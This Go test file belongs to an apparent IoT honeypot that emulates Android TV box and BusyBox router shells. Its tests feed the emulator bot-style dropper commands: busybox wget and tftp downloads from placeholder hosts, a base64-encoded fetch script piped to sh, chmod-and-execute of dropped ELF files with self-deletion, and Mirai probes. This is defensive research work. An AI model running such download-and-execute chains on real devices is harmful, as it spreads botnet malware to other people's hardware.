package shell

import (
	"bytes"
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/generalregulator/botbait/internal/profile"
	"github.com/generalregulator/botbait/internal/vfs"
)

func newShell(t *testing.T, name string) (*Shell, *vfs.FS) {
	t.Helper()
	p, err := profile.Load(name, "unit-test")
	if err != nil {
		t.Fatal(err)
	}
	fs := vfs.NewBase(p).New(vfs.DefaultLimits)
	t0 := time.Date(2026, 10, 26, 12, 0, 0, 0, time.UTC)
	return New(p, fs, Options{Now: func() time.Time { return t0 }, Start: t0}), fs
}

func run(s *Shell, line string) (string, int) {
	r := s.Exec(line)
	return string(r.Combined()), r.Exit
}

func TestEchoEscapesBuildBinary(t *testing.T) {
	s, fs := newShell(t, "android-tvbox")
	s.Exec(`cd /data/local/tmp`)
	s.Exec(`echo -ne "\x7f\x45\x4c\x46\x01\x01\x01" > .x`)
	s.Exec(`echo -ne "\x00\x00\x02\x80" >> .x`)
	s.Exec(`printf '\177ELF\n' >> .x`)
	got, err := fs.ReadFile("/data/local/tmp/.x")
	if err != nil {
		t.Fatal(err)
	}
	want := []byte("\x7fELF\x01\x01\x01\x00\x00\x02\x80\x7fELF\n")
	if !bytes.Equal(got, want) {
		t.Fatalf("got %q want %q", got, want)
	}
	c := fs.Created()
	if len(c) != 1 || !bytes.Equal(c[0].Data, want) {
		t.Fatalf("harvest: %+v", c)
	}
}

func TestEchoVariants(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	for in, want := range map[string]string{
		`echo hello world`:       "hello world\n",
		`echo -n hi`:             "hi",
		`echo 'a  b'`:            "a  b\n",
		`echo "tab\there"`:       "tab\there\n",
		`echo -E 'x\ny'`:         `x\ny` + "\n",
		`echo ok; echo done`:     "ok\ndone\n",
		`echo $HOME`:             "/\n",
		`X=5; echo v=$X`:         "v=5\n",
		`echo ${NOPE:-fallback}`: "fallback\n",
		`echo a\ b`:              "a b\n",
	} {
		if got, _ := run(s, in); got != want {
			t.Errorf("%s => %q, want %q", in, got, want)
		}
	}
}

func TestChainsAndExitStatus(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	if got, _ := run(s, `false && echo no || echo yes`); got != "yes\n" {
		t.Fatalf("got %q", got)
	}
	if got, _ := run(s, `true && echo a; false || echo b`); got != "a\nb\n" {
		t.Fatalf("got %q", got)
	}
	if got, code := run(s, `ls /nonexistent`); code == 0 || !strings.Contains(got, "No such file") {
		t.Fatalf("ls missing: %q %d", got, code)
	}
	if got, _ := run(s, "echo $?"); got != "1\n" && got != "0\n" {
		t.Fatalf("$?: %q", got)
	}
}

func TestCommandNotFoundUsesProfileFormat(t *testing.T) {
	a, _ := newShell(t, "android-tvbox")
	if got, code := run(a, `frobnicate`); got != "/system/bin/sh: frobnicate: not found\n" || code != 127 {
		t.Fatalf("android: %q %d", got, code)
	}
	r, _ := newShell(t, "router-busybox")
	if got, _ := run(r, `frobnicate`); got != "-sh: frobnicate: not found\n" {
		t.Fatalf("router: %q", got)
	}

	if got, _ := run(a, `wget http://198.51.100.9/x`); !strings.Contains(got, "not found") {
		t.Fatalf("plain wget must be missing on android: %q", got)
	}
}

func TestCdFallbackChainLikeBots(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	run(s, `cd /tmp || cd /var/run || cd /mnt || cd /data/local/tmp || cd /`)
	if s.Cwd() != "/mnt" {
		t.Fatalf("cwd=%s (android has no /tmp or /var/run but has /mnt)", s.Cwd())
	}
	r, _ := newShell(t, "router-busybox")
	run(r, `cd /tmp`)
	if r.Cwd() != "/tmp" {
		t.Fatalf("router cwd=%s", r.Cwd())
	}
}

func TestFetchStageLooksSuccessfulAndIsNotHarvested(t *testing.T) {
	s, fs := newShell(t, "android-tvbox")
	out, code := run(s, `cd /data/local/tmp && busybox wget http://198.51.100.9/mips.sh && chmod 777 mips.sh && ls -l mips.sh`)
	if code != 0 || !strings.Contains(out, "saved") || !strings.Contains(out, "-rwxrwxrwx") || !strings.Contains(out, "mips.sh") {
		t.Fatalf("fetch chain: %q (%d)", out, code)
	}
	if len(fs.Created()) != 0 {
		t.Fatal("pretend downloads must not be harvested")
	}
	if out, _ := run(s, `busybox wget -q -O x http://198.51.100.9/a; ls`); !strings.Contains(out, "x\n") || strings.Contains(out, "saved") {
		t.Fatalf("-q/-O: %q", out)
	}
	if out, _ := run(s, `busybox tftp -g -r bot.arm -l bot 198.51.100.9; busybox tftp -g -r z 198.51.100.9; ls`); !strings.Contains(out, "bot") {
		t.Fatalf("tftp: %q", out)
	}
}

func TestScriptExecutionRevealsHiddenURLs(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	run(s, `cd /data/local/tmp`)

	script := "cd /data/local/tmp; busybox wget http://198.51.100.77/hidden.arm -O .h; chmod +x .h\n"
	b64 := "Y2QgL2RhdGEvbG9jYWwvdG1wOyBidXN5Ym94IHdnZXQgaHR0cDovLzE5OC41MS4xMDAuNzcvaGlkZGVuLmFybSAtTyAuaDsgY2htb2QgK3ggLmgK"
	run(s, `echo `+b64+` | base64 -d | sh`)
	joined := strings.Join(s.Revealed(), "\n")
	if !strings.Contains(joined, "http://198.51.100.77/hidden.arm") {
		t.Fatalf("hidden URL not revealed: %q (script was %q)", joined, script)
	}
}

func TestSelfWrittenScriptIsInterpreted(t *testing.T) {
	s, fs := newShell(t, "android-tvbox")
	run(s, `cd /data/local/tmp`)
	run(s, `echo 'busybox wget http://198.51.100.5/p -O /data/local/tmp/p' > s.sh`)
	run(s, `echo 'chmod 755 /data/local/tmp/p' >> s.sh`)
	out, _ := run(s, `sh s.sh; ls -l p`)
	if !strings.Contains(out, "-rwxr-xr-x") {
		t.Fatalf("script effects missing: %q", out)
	}
	if len(s.Revealed()) < 2 {
		t.Fatalf("revealed: %v", s.Revealed())
	}

	if out, code := run(s, `./s.sh`); code != 126 || !strings.Contains(out, "Permission denied") {
		t.Fatalf("not executable yet: %q %d", out, code)
	}
	run(s, `chmod +x s.sh`)
	if _, code := run(s, `./s.sh`); code != 0 {
		t.Fatalf("executable script failed: %d", code)
	}
	_ = fs
}

func TestBinaryExecutionIsSilent(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	run(s, `cd /data/local/tmp; echo -ne "\x7fELF\x01" > b; chmod +x b`)
	if out, code := run(s, `./b arg1 arg2; echo after`); out != "after\n" || code != 0 {
		t.Fatalf("%q %d", out, code)
	}
}

func TestDropperSelfDeletionStillHarvested(t *testing.T) {
	s, fs := newShell(t, "android-tvbox")
	run(s, `cd /data/local/tmp; echo -ne "\x7fELFpayload" > .d; chmod +x .d; ./.d; rm -f .d`)
	if _, ok := fs.Stat("/data/local/tmp/.d"); ok {
		t.Fatal("file must be gone")
	}
	c := fs.Created()
	if len(c) != 1 || !bytes.HasPrefix(c[0].Data, []byte("\x7fELF")) {
		t.Fatalf("harvest after rm: %+v", c)
	}
}

func TestAndroidFingerprintingCommands(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	cases := map[string]string{
		`getprop ro.product.model`:              "MXQ-4K\n",
		`getprop ro.build.version.release`:      "7.1.2\n",
		`getprop nosuch.prop`:                   "\n",
		`getprop nosuch.prop dflt`:              "dflt\n",
		`uname -m`:                              "armv7l\n",
		`uname -r`:                              "3.14.29\n",
		`whoami`:                                "root\n",
		`pm list packages | grep -c droidlogic`: "",
	}
	for in, want := range cases {
		got, _ := run(s, in)
		if want != "" && got != want {
			t.Errorf("%s => %q want %q", in, got, want)
		}
	}
	if out, _ := run(s, `pm list packages | grep -c droidlogic`); strings.TrimSpace(out) == "0" {
		t.Fatalf("droidlogic packages missing: %q", out)
	}
	if out, _ := run(s, `pm list packages -3`); strings.Contains(out, "com.android.settings") || !strings.Contains(out, "package:org.xbmc.kodi") {
		t.Fatalf("-3 filter: %q", out)
	}
	if out, _ := run(s, `cat /proc/cpuinfo | grep -c processor`); strings.TrimSpace(out) != "4" {
		t.Fatalf("cpuinfo processors: %q", out)
	}
	if out, _ := run(s, `uname -a`); !strings.HasPrefix(out, "Linux localhost 3.14.29 #1 SMP PREEMPT") {
		t.Fatalf("uname -a: %q", out)
	}
	if out, _ := run(s, `id`); !strings.HasPrefix(out, "uid=0(root)") {
		t.Fatalf("id: %q", out)
	}
	if out, _ := run(s, `setprop persist.foo bar; getprop persist.foo`); out != "bar\n" {
		t.Fatalf("setprop: %q", out)
	}
	if out, _ := run(s, `pm install -r /data/local/tmp/x.apk`); out != "Success\n" {
		t.Fatalf("pm install: %q", out)
	}
	if out, _ := run(s, `am start -a android.intent.action.VIEW -d http://x`); !strings.HasPrefix(out, "Starting: Intent {") {
		t.Fatalf("am start: %q", out)
	}
}

func TestProfileCommandsOverride(t *testing.T) {
	s, _ := newShell(t, "router-busybox")
	if out, _ := run(s, `ifconfig`); !strings.Contains(out, "br0") || !strings.Contains(out, "00:e0:4c:") {
		t.Fatalf("ifconfig: %q", out)
	}
	if out, _ := run(s, `netstat -an`); !strings.Contains(out, "0.0.0.0:23") {
		t.Fatalf("netstat -an: %q", out)
	}
	if out, _ := run(s, `df -h`); !strings.Contains(out, "mtdblock1") {
		t.Fatalf("df prefix fallback: %q", out)
	}
	if out, _ := run(s, `uname -a`); !strings.Contains(out, "mips") || !strings.Contains(out, "Router") {
		t.Fatalf("uname -a: %q", out)
	}
	if out, _ := run(s, `cat /proc/cpuinfo`); !strings.Contains(out, "RTL8196C") {
		t.Fatalf("cpuinfo: %q", out)
	}
}

func TestBusyBoxMiraiProbe(t *testing.T) {
	s, _ := newShell(t, "router-busybox")
	if out, _ := run(s, `/bin/busybox MIRAI`); out != "MIRAI: applet not found\n" {
		t.Fatalf("mirai probe: %q", out)
	}
	if out, _ := run(s, `busybox`); !strings.HasPrefix(out, "BusyBox v1.22.1") {
		t.Fatalf("banner: %q", out)
	}
	if out, _ := run(s, `busybox cat /etc/hosts`); out != "127.0.0.1 localhost\n" {
		t.Fatalf("applet dispatch: %q", out)
	}
}

func TestPipesRedirectsAndGlobs(t *testing.T) {
	s, _ := newShell(t, "router-busybox")
	run(s, `cd /tmp; echo one > a; echo two > b; echo three > c.txt`)
	if out, _ := run(s, `cat a b | wc -l`); strings.TrimSpace(out) != "2" {
		t.Fatalf("pipe: %q", out)
	}
	if out, _ := run(s, `ls *.txt`); out != "c.txt\n" {
		t.Fatalf("glob: %q", out)
	}
	if out, _ := run(s, `cat /nonexistent 2>/dev/null; echo ok`); out != "ok\n" {
		t.Fatalf("2>/dev/null: %q", out)
	}
	if out, _ := run(s, `cat /nonexistent 2>&1 | grep -c "No such"`); strings.TrimSpace(out) != "1" {
		t.Fatalf("2>&1: %q", out)
	}
	if out, _ := run(s, `echo x > /proc/sys/vm/drop_caches; echo fine`); out != "fine\n" {
		t.Fatalf("/proc write: %q", out)
	}
	if out, _ := run(s, `rm -rf /tmp/a /tmp/b; ls /tmp`); out != "c.txt\n" {
		t.Fatalf("rm: %q", out)
	}
	out, _ := run(s, `md5sum /tmp/c.txt`)
	f := strings.Fields(out)
	if len(f) != 2 || len(f[0]) != 32 || f[1] != "/tmp/c.txt" {
		t.Fatalf("md5sum format: %q", out)
	}
}

func TestControlFlow(t *testing.T) {
	s, _ := newShell(t, "router-busybox")
	if out, _ := run(s, `for i in a b c; do echo item-$i; done`); out != "item-a\nitem-b\nitem-c\n" {
		t.Fatalf("for: %q", out)
	}
	if out, _ := run(s, `if [ -d /tmp ]; then echo yes; else echo no; fi`); out != "yes\n" {
		t.Fatalf("if: %q", out)
	}
	if out, _ := run(s, `if [ -f /nope ]; then echo yes; else echo no; fi`); out != "no\n" {
		t.Fatalf("if else: %q", out)
	}
	if out, _ := run(s, `[ -f /etc/passwd ] && echo exists || echo missing`); out != "exists\n" {
		t.Fatalf("[ ]: %q", out)
	}

	start := time.Now()
	out, _ := run(s, `while true; do echo tick; sleep 60; done`)
	if time.Since(start) > time.Second || strings.Count(out, "tick") > 2 {
		t.Fatalf("while must be bounded: %q", out)
	}
}

func TestBoundsAgainstAbuse(t *testing.T) {
	s, _ := newShell(t, "router-busybox")

	line := strings.Repeat("echo x; ", 5000)
	r := s.Exec(line)
	if len(r.Stdout) > maxOutput || s.steps > maxSteps+1 {
		t.Fatalf("step cap: out=%d steps=%d", len(r.Stdout), s.steps)
	}

	run(s, `cd /tmp; echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > f`)
	for i := 0; i < 40; i++ {
		run(s, `cat f f > g; mv g f`)
	}
	if info, _ := s.fs.Stat("/tmp/f"); info.Size > vfs.DefaultLimits.MaxFileBytes {
		t.Fatalf("file grew past the cap: %d", info.Size)
	}

	run(s, `sh -c 'sh -c "sh -c \"sh -c \\\"sh -c \\\\\\\"sh -c x\\\\\\\"\\\"\""'`)

	run(s, `cd /tmp; echo `+strings.Repeat("A", 4000)+` > big`)
	r = s.Exec(strings.Repeat("cat /tmp/big; ", 200))
	if len(r.Stdout) > maxOutput {
		t.Fatalf("output cap: %d", len(r.Stdout))
	}
}

func TestExitAndReboot(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	if r := s.Exec(`echo bye; exit`); !r.Quit || string(r.Stdout) != "bye\n" {
		t.Fatalf("%+v", r)
	}
	if r := s.Exec(`sh -c 'exit 3'; echo still`); r.Quit || string(r.Stdout) != "still\n" {
		t.Fatalf("exit in nested sh must not end the session: %+v", r)
	}
	if r := s.Exec(`reboot`); !r.Quit {
		t.Fatal("reboot must drop the session")
	}
}

func TestSuAndNohupWrappers(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	if out, _ := run(s, `su -c "echo rooted"`); out != "rooted\n" {
		t.Fatalf("su -c: %q", out)
	}
	if out, _ := run(s, `su 0 echo r2`); out != "r2\n" {
		t.Fatalf("su 0: %q", out)
	}
	if out, _ := run(s, `nohup echo bg &`); out != "bg\n" {
		t.Fatalf("nohup: %q", out)
	}
}

func TestUptimeAdvancesAndProcUptime(t *testing.T) {
	p, _ := profile.Load("android-tvbox", "s")
	fs := vfs.NewBase(p).New(vfs.DefaultLimits)
	now := time.Date(2026, 1, 1, 0, 0, 0, 0, time.UTC)
	s := New(p, fs, Options{Now: func() time.Time { return now }, Start: now})
	a, _ := run(s, `cat /proc/uptime`)
	now = now.Add(90 * time.Second)
	b, _ := run(s, `cat /proc/uptime`)
	if a == b || !strings.HasPrefix(a, "1893421.") || !strings.HasPrefix(b, "1893511.") {
		t.Fatalf("uptime: %q -> %q", a, b)
	}
}

func TestPromptAndHostname(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	if s.Prompt() != "root@p212:/ # " {
		t.Fatalf("prompt %q", s.Prompt())
	}
	run(s, `cd /data/local/tmp`)
	if s.Prompt() != "root@p212:/data/local/tmp # " {
		t.Fatalf("prompt %q", s.Prompt())
	}
	r, _ := newShell(t, "router-busybox")
	if r.TelnetPrompt() != "# " {
		t.Fatalf("telnet prompt %q", r.TelnetPrompt())
	}
}

func TestLexer(t *testing.T) {
	toks := lex(`cd /tmp; wget "http://a/b;c" -O x 2>/dev/null && echo 'q'|sh #comment`)
	var got []string
	for _, tk := range toks {
		got = append(got, tk.s)
	}
	want := `cd|/tmp|;|wget|"http://a/b;c"|-O|x|2>|/dev/null|&&|echo|'q'|||sh`
	if strings.Join(got, "|") != want {
		t.Fatalf("tokens: %s", strings.Join(got, "|"))
	}

	s, _ := newShell(t, "android-tvbox")
	if out, _ := run(s, `echo $(id)`); out != "$(id)\n" {
		t.Fatalf("command substitution must stay literal: %q", out)
	}
	if out, _ := run(s, "echo `id`"); out != "`id`\n" {
		t.Fatalf("backticks must stay literal: %q", out)
	}
}

func TestPrintf(t *testing.T) {
	s, _ := newShell(t, "router-busybox")
	for in, want := range map[string]string{
		`printf 'a\tb\n'`:          "a\tb\n",
		`printf '%s-%s\n' x y`:     "x-y\n",
		`printf '%d %x\n' 255 255`: "255 ff\n",
		`printf '\x41\101\n'`:      "AA\n",
		`printf '%s\n' a b c`:      "a\nb\nc\n",
		`printf 'no newline'`:      "no newline",
	} {
		if got, _ := run(s, in); got != want {
			t.Errorf("%s => %q want %q", in, got, want)
		}
	}
}

func withProfile(t *testing.T, name string, mod func(*profile.Profile)) (*Shell, *vfs.FS) {
	t.Helper()
	p, err := profile.Load(name, "unit-test")
	if err != nil {
		t.Fatal(err)
	}
	mod(p)
	if err := p.Validate(); err != nil {
		t.Fatal(err)
	}
	fs := vfs.NewBase(p).New(vfs.DefaultLimits)
	t0 := time.Date(2026, 10, 26, 12, 0, 0, 0, time.UTC)
	return New(p, fs, Options{Now: func() time.Time { return t0 }, Start: t0}), fs
}

func TestArchitectureDetectionTricks(t *testing.T) {
	s, _ := newShell(t, "android-tvbox")
	for _, line := range []string{
		`dd bs=52 count=1 if=/system/bin/ls 2>/dev/null | wc -c`,
		`head -c 52 /system/bin/ls | wc -c`,
		`cat /proc/self/exe | head -c 52 | wc -c`,
	} {
		if out, _ := run(s, line); strings.TrimSpace(out) != "52" {
			t.Errorf("%s -> %q", line, out)
		}
	}
	if out, _ := run(s, `head -c 4 /system/bin/ls | od -An -tx1`); strings.TrimSpace(out) != "7f 45 4c 46" {
		t.Errorf("magic bytes: %q", out)
	}

	if out, _ := run(s, `dd bs=52 count=1 if=/system/bin/ls of=/dev/null`); !strings.Contains(out, "1+0 records in") {
		t.Errorf("dd summary: %q", out)
	}
}

func TestInspectingAnUploadedFile(t *testing.T) {
	s, fs := withProfile(t, "router-busybox", func(p *profile.Profile) { p.Bins = append(p.Bins, "file", "xxd") })
	content := []byte("\x7fELF\x01\x02\x01\x00AAAAAAAA\x00\x02\x00\x08rest-of-the-binary strings here\n")
	if err := fs.AddPushed("/tmp/bot", 0o755, int64(len(content)), func() ([]byte, error) { return content, nil }); err != nil {
		t.Fatal(err)
	}
	sum := md5.Sum(content)
	if out, _ := run(s, `md5sum /tmp/bot`); !strings.HasPrefix(out, hex.EncodeToString(sum[:])+"  /tmp/bot") {
		t.Errorf("md5sum: %q", out)
	}
	if out, _ := run(s, `file /tmp/bot`); !strings.Contains(out, "ELF 32-bit MSB executable, MIPS") {
		t.Errorf("file: %q", out)
	}
	if out, _ := run(s, `xxd -l 8 /tmp/bot`); !strings.HasPrefix(out, "00000000: 7f45 4c46 0102 0100") || !strings.Contains(out, ".ELF....") {
		t.Errorf("xxd: %q", out)
	}
	if out, _ := run(s, `hexdump -C /tmp/bot | head -n 1`); !strings.HasPrefix(out, "00000000  7f 45 4c 46 01 02 01 00  41 41 41 41 41 41 41 41  |.ELF....AAAAAAAA|") {
		t.Errorf("hexdump -C: %q", out)
	}
	if out, _ := run(s, `strings /tmp/bot`); !strings.Contains(out, "rest-of-the-binary strings here") {
		t.Errorf("strings: %q", out)
	}
	if out, _ := run(s, `ls -l /tmp/bot`); !strings.Contains(out, " "+strconv.Itoa(len(content))+" ") {
		t.Errorf("ls -l size: %q", out)
	}
	if len(fs.Created()) != 0 {
		t.Fatal("inspection must not create samples")
	}
}

func TestScriptedOutputForUploadedFiles(t *testing.T) {
	botHash := sha256.Sum256([]byte("\x7fELFmirai"))
	s, fs := withProfile(t, "android-tvbox", func(p *profile.Profile) {
		p.ExecRules = []profile.ExecRule{
			{SHA256: hex.EncodeToString(botHash[:]), Stdout: "listening tun0\n"},
			{FileType: "ELF", Path: `^/tmp/`, Stdout: "ok\n", Exit: 3},
		}
		p.Commands["./special"] = "custom magic\n"
	})
	_ = fs.WriteFile("/data/local/tmp/a", []byte("\x7fELFmirai"), false)
	_ = fs.WriteFile("/data/local/tmp/b", []byte("\x7fELFother"), false)
	_ = fs.WriteFile("/data/local/tmp/special", []byte("\x7fELFx"), false)
	_ = fs.Chmod("/data/local/tmp/a", 0o755)
	_ = fs.Chmod("/data/local/tmp/b", 0o755)
	_ = fs.Chmod("/data/local/tmp/special", 0o755)
	s.Exec("cd /data/local/tmp")
	if out, code := run(s, `./a`); out != "listening tun0\n" || code != 0 {
		t.Errorf("sha rule: %q %d", out, code)
	}
	if out, code := run(s, `./b`); out != "" || code != 0 {
		t.Errorf("unmatched binary must run silently: %q %d", out, code)
	}
	if out, _ := run(s, `./special`); out != "custom magic\n" {
		t.Errorf("commands entry for a path: %q", out)
	}
	_ = fs.Mkdir("/tmp", true)
	_ = fs.WriteFile("/tmp/c", []byte("\x7fELFx"), false)
	_ = fs.Chmod("/tmp/c", 0o755)
	if out, code := run(s, `/tmp/c`); out != "ok\n" || code != 3 {
		t.Errorf("type+path rule: %q %d", out, code)
	}
}

func TestProfileExecRuleValidation(t *testing.T) {
	p, _ := profile.Load("android-tvbox", "x")
	for _, bad := range []profile.ExecRule{
		{},
		{Path: "("},
		{SHA256: "xyz"},
		{FileType: "ELF", Exit: 999},
	} {
		q := *p
		q.ExecRules = []profile.ExecRule{bad}
		if q.Validate() == nil {
			t.Errorf("accepted %+v", bad)
		}
	}
}
